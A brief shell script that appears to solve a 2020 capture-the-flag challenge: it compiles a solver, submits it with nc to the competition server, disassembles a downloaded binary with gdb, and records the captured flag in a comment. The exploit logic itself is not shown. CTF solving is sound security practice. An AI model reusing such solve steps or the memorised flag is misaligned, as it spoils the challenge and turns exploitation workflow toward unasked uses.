#!/bin/sh

# Solved with setuid0
# CTF{This-challenge-was-very-hard}
prob/simple_lang/compiler/compiler solver.simp solver.cc
prob/client solver.simp --download solver_remote -- nc threading.2020.ctfcompetition.com 1337
gdb -batch -ex 'file solver_remote' -ex 'disassemble sbt_huge'
prob/client solver.simp -- nc threading.2020.ctfcompetition.com 1337
